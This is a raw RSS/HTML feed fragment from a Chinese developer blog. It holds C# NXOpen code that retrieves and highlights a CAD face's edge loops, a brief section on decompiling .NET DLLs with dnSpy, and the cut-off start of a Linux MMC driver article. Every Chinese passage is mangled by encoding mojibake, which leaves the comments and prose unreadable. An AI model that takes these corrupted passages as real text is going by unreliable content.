&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; System;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; NXOpen;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt;&lt;span&gt; NXOpen.UF;
&lt;/span&gt;&lt;span&gt;using&lt;/span&gt; System.Collections.Generic;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;C# List&amp;lt;&amp;gt;çš„å‘½åç©ºé—´&lt;/span&gt;
&lt;span&gt;using&lt;/span&gt; System.Runtime.InteropServices;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;DllImportçš„å‘½åç©ºé—´&lt;/span&gt;

&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; OpenAPI
{
    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Ansi, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_OBJ_set_color&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;internal&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; _SetColor(Tag object_id, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; color);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libugopenint.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; uc1601(&lt;span&gt;string&lt;/span&gt; msg, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; mode);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_ask_face_loops&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; AskFaceLoops(Tag faceld, &lt;span&gt;out&lt;/span&gt;&lt;span&gt; IntPtr loopList);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_ask_loop_list_count&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; AskLoopListCount(IntPtr loop, &lt;span&gt;out&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; count);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_ask_loop_list_item&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; AskLoopListItem(IntPtr loopList, &lt;span&gt;int&lt;/span&gt; index, &lt;span&gt;out&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; type, &lt;span&gt;out&lt;/span&gt;&lt;span&gt; IntPtr list);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_delete_loop_list&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; DeleteLoopList(&lt;span&gt;out&lt;/span&gt;&lt;span&gt; IntPtr loopList);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_ask_list_count&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; AskListCount(IntPtr list, &lt;span&gt;out&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; count);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_ask_list_item&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; AskListItem(IntPtr list, &lt;span&gt;int&lt;/span&gt; index, &lt;span&gt;out&lt;/span&gt;&lt;span&gt; Tag obj);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_delete_list&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; DeleteList(&lt;span&gt;out&lt;/span&gt;&lt;span&gt; IntPtr list);

    [DllImport(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;libufun.dll&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, EntryPoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;UF_MODL_create_exp&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)]
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;extern&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; CreateExp(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; expr_str);
}


&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Program
{
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; class members&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; Session theSession;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; UI theUI;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; UFSession theUfSession;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; Program theProgram;
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; isDisposeCalled;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;------------------------------------------------------------------------------
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Constructor
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;------------------------------------------------------------------------------&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Program()
    {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
        {
            theSession &lt;/span&gt;=&lt;span&gt; Session.GetSession();
            theUI &lt;/span&gt;=&lt;span&gt; UI.GetUI();
            theUfSession &lt;/span&gt;=&lt;span&gt; UFSession.GetUFSession();
            isDisposeCalled &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (NXOpen.NXException ex)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ---- Enter your exception handling code here -----
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; UI.GetUI().NXMessageBox.Show(&quot;Message&quot;, NXMessageBox.DialogType.Error, ex.Message);&lt;/span&gt;
&lt;span&gt;        }
    }


    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; è·å–é¢çš„loop
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;face&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;è¾“å…¥é¢çš„tag&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;loops&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;è¾“å‡ºloppsé“¾è¡¨&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; MyAskFaceLoops(Tag face, &lt;span&gt;out&lt;/span&gt; List&amp;lt;List&amp;lt;Tag&amp;gt;&amp;gt;&lt;span&gt; loops)
    {
        NXOpen.Utilities.JAM.StartUFCall();
        loops &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; List&amp;lt;List&amp;lt;Tag&amp;gt;&amp;gt;&lt;span&gt;();
        IntPtr loopList &lt;/span&gt;=&lt;span&gt; IntPtr.Zero;
        OpenAPI.AskFaceLoops(face, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; loopList);

        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; loopCount = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
        OpenAPI.AskLoopListCount(loopList, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; loopCount);
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; listPtrList = &lt;span&gt;new&lt;/span&gt; List&amp;lt;IntPtr&amp;gt;&lt;span&gt;();
        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; loopCount; i++&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; tagList = &lt;span&gt;new&lt;/span&gt; List&amp;lt;Tag&amp;gt;&lt;span&gt;();
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; type = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            IntPtr list &lt;/span&gt;=&lt;span&gt; IntPtr.Zero;
            OpenAPI.AskLoopListItem(loopList, i, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt; type, &lt;span&gt;out&lt;/span&gt;&lt;span&gt; list);
            listPtrList.Add(list);
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; listCount = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            OpenAPI.AskListCount(list, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; listCount);
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; j = &lt;span&gt;0&lt;/span&gt;; j &amp;lt; listCount; j++&lt;span&gt;)
            {
                Tag obj &lt;/span&gt;=&lt;span&gt; Tag.Null;
                OpenAPI.AskListItem(list, j, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; obj);
                tagList.Add(obj);
            }
            loops.Add(tagList);
            OpenAPI.DeleteList(&lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; list);
        }
        OpenAPI.DeleteLoopList(&lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; loopList);
        NXOpen.Utilities.JAM.EndUFCall();
    }


    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;------------------------------------------------------------------------------
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;  Explicit Activation
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;      This entry point is used to activate the application explicitly
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;------------------------------------------------------------------------------&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; Main(&lt;span&gt;string&lt;/span&gt;&lt;span&gt;[] args)
    {
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; retValue = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
        {
            theProgram &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Program();

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;TODO: Add your application code here &lt;/span&gt;
&lt;span&gt;

            Tag aa &lt;/span&gt;= (Tag)&lt;span&gt;47147&lt;/span&gt;;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;é€šè¿‡ç§»åˆ€å·¥å…·å¾—åˆ°é¢çš„tag&lt;/span&gt;
            theUfSession.Obj.SetColor(aa, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;è·å¾—é¢çš„æ‰€æœ‰loop&lt;/span&gt;
            List&amp;lt;List&amp;lt;Tag&amp;gt;&amp;gt; loops = &lt;span&gt;new&lt;/span&gt; List&amp;lt;List&amp;lt;Tag&amp;gt;&amp;gt;&lt;span&gt;();
            MyAskFaceLoops(aa, &lt;/span&gt;&lt;span&gt;out&lt;/span&gt;&lt;span&gt; loops);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;é«˜äº®é¢çš„æ‰€æœ‰loop&lt;/span&gt;
            &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; loops.Count; i++&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; j = &lt;span&gt;0&lt;/span&gt;; j &amp;lt; loops[i].Count; j++&lt;span&gt;)
                {
                    theUfSession.Ui.DisplayMessage(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
                    theUfSession.Disp.SetHighlight(loops[i][j], &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
                }
            }


            theProgram.Dispose();
        }
        &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (NXOpen.NXException ex)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ---- Enter your exception handling code here -----&lt;/span&gt;
&lt;span&gt;
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; retValue;
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;------------------------------------------------------------------------------
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Following method disposes all the class members
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;------------------------------------------------------------------------------&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Dispose()
    {
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isDisposeCalled == &lt;span&gt;false&lt;/span&gt;&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;TODO: Add your application code here &lt;/span&gt;
&lt;span&gt;            }
            isDisposeCalled &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (NXOpen.NXException ex)
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ---- Enter your exception handling code here -----&lt;/span&gt;
&lt;span&gt;
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; GetUnloadOption(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; arg)
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Unloads the image explicitly, via an unload dialog
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;return System.Convert.ToInt32(Session.LibraryUnloadOption.Explicitly);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Unloads the image immediately after execution within NX&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt;&lt;span&gt; System.Convert.ToInt32(Session.LibraryUnloadOption.Immediately);

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;Unloads the image when the NX session terminates
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; return System.Convert.ToInt32(Session.LibraryUnloadOption.AtTermination);&lt;/span&gt;
&lt;span&gt;    }

}


Caesarå¢å°šå®‡
2020å¹´9æœˆ29æ—¥&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929205600692-1132027501.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;6.åç¼–è¯‘åˆ«äººçš„NXäºŒæ¬¡å¼€å‘.net.dllæºä»£ç &lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œåšä¸»æˆ‘ä¸æå€¡éšä¾¿å°±å»åç¼–è¯‘åˆ«äººçš„æºä»£ç ï¼Œè¦å°Šé‡ä½œè€…çš„å¼€å‘æˆæœã€‚&lt;/p&gt;
&lt;p&gt;è‡³äºä»€ä¹ˆæ—¶å€™ï¼Œåç¼–è¯‘ï¼Œè‡ªè¡Œæ–Ÿé…Œå§ï¼Œå“ˆå“ˆ~~ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨ä¸åŠ å£³ï¼ŒåŠ å¯†çš„æ—¶å€™ï¼Œ.netå¾ˆå®¹æ˜“è¢«åç¼–è¯‘ï¼ŒåŠ å£³ä¹Ÿèƒ½å»ç ´è§£çš„ï¼Œæ¯•ç«Ÿæ˜¯æ‰˜ç®¡è¯­è¨€ï¼Œåªè¦åœ¨ä¸­é—´å°±èƒ½åç¼–è¯‘ï¼Œä¸åƒC++é‚£ç§ç›´æ¥åˆ°å†…å­˜ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹å­ï¼šå°±ç”¨æˆ‘ä¸Šé¢å†™çš„loopä¾‹å­ï¼Œç”¨DnSpyåç¼–è¯‘æºä»£ç &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929211145700-898220612.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Â &lt;img src=&quot;https://img2020.cnblogs.com/blog/1631792/202009/1631792-20200929211220476-1848978276.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;


&lt;p&gt;Caesarå¢å°šå®‡&lt;/p&gt;
&lt;p&gt;2020å¹´9æœˆ29æ—¥&lt;/p&gt;

</description>
<pubDate>Tue, 29 Sep 2020 13:14:00 +0000</pubDate>
<dc:creator>Caesarå¢å°šå®‡</dc:creator>
<og:description>åœ¨å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œæˆ‘æ­£åœ¨å¤´æ™•ï¼Œå› ä¸ºä¸‹ç­åè½¦å›å®¶ï¼Œæœ‰äº›æ™•è½¦äº†ã€‚å¤´ç–¼çš„è¦æ­»ã€‚ä¹Ÿåƒä¸ä¸‹å»é¥­ã€‚ æ—©å°±æƒ³äº›è¿™ç¯‡æ–‡ç« äº†ï¼Œä½†æ˜¯æœ€è¿‘ä¸´è¿‘ä¸­ç§‹åä¸€ï¼Œæ™šä¸Šå¤ªå¿™äº†ã€‚ ç‰ˆæœ¬ï¼šNX11+VS2013 æœ€è¿‘è¿™ä¸€å¹´å·²ç»ç”±C++è¿‡</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/nxopen2018/p/13751886.html</dc:identifier>
</item>
<item>
<title>Linux MMC é©±åŠ¨å­ç³»ç»Ÿç®€è¿°ï¼ˆæºç å‰–æï¼‰ - hueyxu</title>
<link>http://www.cnblogs.com/hueyxu/p/13751636.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/hueyxu/p/13751636.html</guid>
<description>&lt;p&gt;Linuxå†…æ ¸è®¾è®¡äº†MMCå­ç³»ç»Ÿï¼Œç”¨äºç®¡ç†MMC/SDè®¾å¤‡ã€‚æœ¬æ–‡é€šè¿‡å†…æ ¸æºç ï¼ˆLinux Kernel 5.2ï¼‰å¯¹MMCé©±åŠ¨å­ç³»ç»Ÿè¿›è¡Œç®€è¿°ï¼Œé€šè¿‡MMCé©±åŠ¨çš„å®é™…æ¡ˆä¾‹è¯´æ˜MMCé©±åŠ¨ç¼–å†™çš„ä¸€èˆ¬æ­¥éª¤ï¼Œå¹¶åˆ†æé©±åŠ¨æ¨¡å‹ä¸‹å®Œæˆé©±åŠ¨ã€è®¾å¤‡ç»‘å®šçš„è¿‡ç¨‹ã€‚&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;127.43222284261&quot;&gt;

&lt;p&gt;&lt;span&gt;å—è®¾å¤‡æ˜¯Linuxç³»ç»Ÿä¸­çš„åŸºç¡€å¤–è®¾ä¹‹ä¸€ï¼Œè€Œ MMC/SD å­˜å‚¨è®¾å¤‡æ˜¯ä¸€ç§å…¸å‹çš„å—è®¾å¤‡ã€‚Linuxå†…æ ¸è®¾è®¡äº†Â &lt;strong&gt;MMCå­ç³»ç»Ÿ&lt;/strong&gt;ï¼Œç”¨äºç®¡ç† MMC/SD è®¾å¤‡ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;MMC å­ç³»ç»Ÿçš„æ¡†æ¶ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå…¶ä¸­&lt;strong&gt;core layer&lt;/strong&gt;æ ¹æ®MMC/SDè®¾å¤‡åè®®æ ‡å‡†å®ç°äº†åè®®ã€‚&lt;strong&gt;card layer&lt;/strong&gt;ä¸Linuxçš„å—è®¾å¤‡å­ç³»ç»Ÿå¯¹æ¥ï¼Œå®ç°å—è®¾å¤‡é©±åŠ¨ä»¥åŠå®Œæˆè¯·æ±‚ï¼Œå…·ä½“åè®®ç»è¿‡&lt;strong&gt;core layer&lt;/strong&gt;çš„æ¥å£ï¼Œæœ€ç»ˆé€šè¿‡&lt;strong&gt;hostÂ layer&lt;/strong&gt;å®Œæˆä¼ è¾“ï¼Œå¯¹ MMCè®¾å¤‡è¿›è¡Œå®é™…çš„æ“ä½œã€‚å’Œ MMCè®¾å¤‡ç¡¬ä»¶ç›¸å¯¹åº”ï¼Œ&lt;strong&gt;host&lt;/strong&gt;å’Œcardå¯ä»¥åˆ†åˆ«ç†è§£ä¸º MMC deviceçš„ä¸¤ä¸ªå­è®¾å¤‡ï¼šMMCä¸»è®¾å¤‡å’ŒMMCä»è®¾å¤‡ï¼Œå…¶ä¸­hostä¸ºé›†æˆäºMMCè®¾å¤‡å†…éƒ¨çš„MMC controllerï¼Œcardä¸ºMMCè®¾å¤‡å†…éƒ¨å®é™…çš„å­˜å‚¨è®¾å¤‡ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hughesxu.github.io/assets/img/sample/mmc_subsystem.svg&quot; alt=&quot;MMC Subsystem&quot; width=&quot;159&quot; height=&quot;331&quot; data-loaded=&quot;true&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Linuxç³»ç»Ÿä¸­ï¼Œä½¿ç”¨ä¸¤ä¸ªç»“æ„ä½“Â &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_host&lt;/span&gt;Â å’ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;&lt;span&gt;struct&lt;/span&gt; mmc_card&lt;/span&gt;Â åˆ†åˆ«æè¿°hostå’Œcardï¼Œå…¶ä¸­hostè®¾å¤‡è¢«å°è£…æˆÂ &lt;span class=&quot;cnblogs_code&quot;&gt;platform_device&lt;/span&gt;Â æ³¨å†Œåˆ°Linuxé©±åŠ¨æ¨¡å‹ä¸­ã€‚æ•´ä½“è€Œè¨€ï¼Œï¼ˆLinuxé©±åŠ¨æ¨¡å‹æ¡†æ¶ä¸‹ï¼‰MMCé©±åŠ¨å­ç³»ç»ŸåŒ…æ‹¬ä¸‰ä¸ªéƒ¨åˆ†ï¼š&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;MMCæ€»çº¿ï¼ˆÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_bus&lt;/span&gt;Â ï¼‰&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;å°è£…åœ¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;platform_device&lt;/span&gt;ä¸‹çš„hostè®¾å¤‡&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;ä¾é™„äºMMCæ€»çº¿çš„MMCé©±åŠ¨ï¼ˆÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_driver&lt;/span&gt;Â ï¼‰&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;ä¸‹æ–‡å°†é€šè¿‡å†…æ ¸æºç ï¼ˆLinux Kernel 5.2ï¼‰å¯¹MMCé©±åŠ¨å­ç³»ç»Ÿè¿›è¡Œç®€è¿°ï¼Œå¹¶é€šè¿‡MMCé©±åŠ¨çš„å®é™…æ¡ˆä¾‹è¯´æ˜MMCé©±åŠ¨ç¼–å†™çš„ä¸€èˆ¬æ­¥éª¤ï¼ŒåŒæ—¶åˆ†æé©±åŠ¨æ¨¡å‹ä¸‹å®Œæˆé©±åŠ¨ã€è®¾å¤‡ç»‘å®šçš„è¿‡ç¨‹ã€‚å¦‚å¯¹Linuxè®¾å¤‡é©±åŠ¨æ¨¡å‹ä¸ç†Ÿæ‚‰ï¼Œå¯ä»¥å‚è€ƒå¦ä¸€ç¯‡åšæ–‡ï¼š&lt;a href=&quot;https://www.cnblogs.com/hueyxu/p/13659262.html&quot;&gt;Linuxè®¾å¤‡é©±åŠ¨æ¨¡å‹ç®€è¿°ï¼ˆæºç å‰–æï¼‰&lt;/a&gt;ã€‚&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;MMCæ€»çº¿çš„æ³¨å†Œå’ŒÂ &lt;span class=&quot;cnblogs_code&quot;&gt;platform&lt;/span&gt;Â æ€»çº¿çš„æ³¨å†Œæ–¹æ³•ç›¸åŒï¼Œå‡æ˜¯è°ƒç”¨Â &lt;span class=&quot;cnblogs_code&quot;&gt;bus_register()&lt;/span&gt;Â å‡½æ•°ã€‚å‡½æ•°çš„è°ƒç”¨å…¥å£ä½äºÂ &lt;span class=&quot;cnblogs_code&quot;&gt;mmc/core/core.c&lt;/span&gt;Â ï¼Œé€šè¿‡Â &lt;span class=&quot;cnblogs_code&quot;&gt;mmc_init()&lt;/span&gt;Â å®ç°ï¼Œæ­¤å¤„ä¸»è¦å…³æ³¨MMCçš„éƒ¨åˆ†ã€‚&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
